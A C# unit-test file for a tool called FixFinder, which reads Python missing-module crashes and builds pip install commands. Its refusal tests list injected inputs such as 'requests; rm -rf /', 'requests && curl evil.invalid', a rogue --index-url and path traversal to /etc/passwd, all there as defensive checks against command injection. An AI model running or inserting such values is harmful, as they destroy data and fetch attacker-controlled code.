using FixFinder.Core.Execution;
using FixFinder.Core.Parsing;
using FixFinder.Core.Sources;

namespace FixFinder.Tests;

/// <summary>
/// Reading a missing package out of a crash, and refusing to build a command out of anything else.
/// </summary>
/// <remarks>
/// The module name arrives from whatever the program printed, and a program can print anything.
/// That makes this the one place in FixFinder where untrusted output becomes a command line, so
/// most of what is below is about what it declines to do.
/// </remarks>
public class MissingModuleTests
{
    private static readonly string? Python =
        TargetFactory.FindOnPath("python") ??
        TargetFactory.FindOnPath("py") ??
        TargetFactory.FindOnPath("python3");

    private static ParsedError Error(string message, string type = "ModuleNotFoundError") => new()
    {
        LanguageId = "python",
        Confidence = 90,
        RawText = $"{type}: {message}",
        FirstLineSequence = 0,
        ExceptionType = type,
        Message = message,
        Frames = [],
    };

    private static TargetSpec Spec(string? executable = null) => new()
    {
        ExecutablePath = executable ?? Python ?? @"C:\Python313\python.exe",
        Arguments = "app.py",
        WorkingDirectory = @"C:\work",
    };

    // ------------------------------------------------------------------ reading it

    [Theory]
    [InlineData("No module named 'requests'", "requests", "requests")]
    [InlineData("No module named 'yaml'", "yaml", "pyyaml")]
    [InlineData("No module named 'cv2'", "cv2", "opencv-python")]
    [InlineData("No module named 'PIL'", "PIL", "pillow")]
    [InlineData("No module named 'sklearn'", "sklearn", "scikit-learn")]
    public void TheImportNameIsMappedToThePackageThatProvidesIt(
        string message, string module, string package)
    {
        var missing = MissingModule.Read(Error(message));

        Assert.NotNull(missing);
        Assert.Equal(module, missing!.Module);
        Assert.Equal(package, missing.Package);
    }

    /// <summary>
    /// A failed submodule import means the whole distribution is missing.
    /// </summary>
    /// <remarks>
    /// <c>pip install yaml.loader</c> installs nothing at all; the package is <c>pyyaml</c>.
    /// </remarks>
    [Fact]
    public void ASubmoduleResolvesToItsTopLevelPackage()
    {
        var missing = MissingModule.Read(Error("No module named 'yaml.loader'"));

        Assert.Equal("yaml.loader", missing!.Module);
        Assert.Equal("pyyaml", missing.Package);
    }

    [Fact]
    public void AnErrorThatIsNotAboutAMissingModuleIsIgnored()
    {
        Assert.Null(MissingModule.Read(Error("'b'", "KeyError")));
        Assert.Null(MissingModule.Read(Error("division by zero", "ZeroDivisionError")));
    }

    // ------------------------------------------------------------------ refusing it

    /// <summary>
    /// Nothing that is not a plain import name becomes part of a command.
    /// </summary>
    /// <remarks>
    /// The security boundary. A program can print whatever it likes on stderr, including a line
    /// shaped exactly like a ModuleNotFoundError, so a name carrying a switch, a path, a URL or a
    /// shell separator is refused rather than cleaned up - there is no legitimate import that
    /// looks like any of these.
    /// </remarks>
    [Theory]
    [InlineData("--index-url=http://evil.invalid/simple")]
    [InlineData("-e")]
    [InlineData("requests; rm -rf /")]
    [InlineData("requests && curl evil.invalid")]
    [InlineData("../../../etc/passwd")]
    [InlineData("http://evil.invalid/pkg.tar.gz")]
    [InlineData("C:\\Windows\\System32")]
    [InlineData("requests --target C:\\Windows")]
    [InlineData("")]
    public void AModuleNameThatIsNotAnIdentifierIsRefused(string name)
    {
        Assert.Null(MissingModule.Read(Error($"No module named '{name}'")));
    }

    /// <summary>The refusal holds all the way out, not just at the reading stage.</summary>
    [Theory]
    [InlineData("--index-url=http://evil.invalid/simple")]
    [InlineData("requests; rm -rf /")]
    public void NoCommandIsBuiltFromARefusedName(string name)
    {
        Assert.Null(MissingModule.For(Error($"No module named '{name}'"), Spec()));
    }

    // ------------------------------------------------------------------ the command

    /// <summary>
    /// Installed with the interpreter that crashed, not with whichever pip is on PATH.
    /// </summary>
    /// <remarks>
    /// On a machine with several Pythons those are different environments, and installing into
    /// the wrong one gives the most confusing outcome available: a successful install and an
    /// unchanged error.
    /// </remarks>
    [Fact]
    public void TheCommandUsesTheInterpreterThatActuallyRan()
    {
        var candidate = MissingModule.For(
            Error("No module named 'yaml'"), Spec(@"C:\Python313\python.exe"));

        Assert.NotNull(candidate);
        Assert.Equal(FixTier.Dependency, candidate!.Tier);
        Assert.Equal(@"""C:\Python313\python.exe"" -m pip install pyyaml", candidate.Command);
    }

    /// <summary>
    /// Nothing is offered for a program that was not run by Python.
    /// </summary>
    /// <remarks>
    /// A Java or Node program can report its own missing dependency, and pointing pip at one
    /// would be worse than offering nothing at all.
    /// </remarks>
    [Theory]
    [InlineData(@"C:\Program Files\Microsoft\jdk-21\bin\java.exe")]
    [InlineData(@"C:\Program Files\nodejs\node.exe")]
    [InlineData(@"C:\out\a.exe")]
    public void NothingIsOfferedWhenPythonDidNotRunIt(string executable)
    {
        Assert.Null(MissingModule.For(Error("No module named 'yaml'"), Spec(executable)));
    }

    [Fact]
    public void NothingIsOfferedWithNoTargetAtAll()
    {
        Assert.Null(MissingModule.For(Error("No module named 'yaml'"), null));
    }

    /// <summary>The mismatch is worth saying out loud, since it is the reason this exists.</summary>
    [Fact]
    public void AMismatchedPackageNameIsExplainedInTheBody()
    {
        var candidate = MissingModule.For(Error("No module named 'yaml'"), Spec());

        Assert.Contains("imported as `yaml`", candidate!.BodyText, StringComparison.Ordinal);
        Assert.Contains("published as `pyyaml`", candidate.BodyText, StringComparison.Ordinal);
    }

    [Fact]
    public void AMatchingNameIsNotExplainedAtLength()
    {
        var candidate = MissingModule.For(Error("No module named 'requests'"), Spec());

        Assert.DoesNotContain("published as", candidate!.BodyText, StringComparison.Ordinal);
    }

    // ------------------------------------------------------------------ against a real interpreter

    /// <summary>
    /// The whole path, driven off a real crash from a real Python.
    /// </summary>
    /// <remarks>
    /// The command is checked rather than run: installing a package as a side effect of a test
    /// would change the machine the rest of the suite runs on.
    /// </remarks>
    [Fact]
    public async Task ARealMissingImportProducesTheRightCommand()
    {
        if (Python is null) return;

        using var temp = new TempFolder();

        var script = Path.Combine(temp.Path, "needs.py");
        File.WriteAllText(script, "import yaml\nprint(yaml)\n");

        var spec = new TargetSpec
        {
            ExecutablePath = Python,
            Arguments = $"\"{script}\"",
            WorkingDirectory = temp.Path,
            Timeout = TimeSpan.FromSeconds(30),
        };

        var run = await new TargetRunner(new ParserRegistry()).RunAsync(spec, CancellationToken.None);

        Assert.NotNull(run.Error);

        var candidate = MissingModule.For(run.Error!, spec);

        Assert.NotNull(candidate);
        Assert.EndsWith("-m pip install pyyaml", candidate!.Command!, StringComparison.Ordinal);
        Assert.Contains(Python, candidate.Command!, StringComparison.OrdinalIgnoreCase);
    }
}
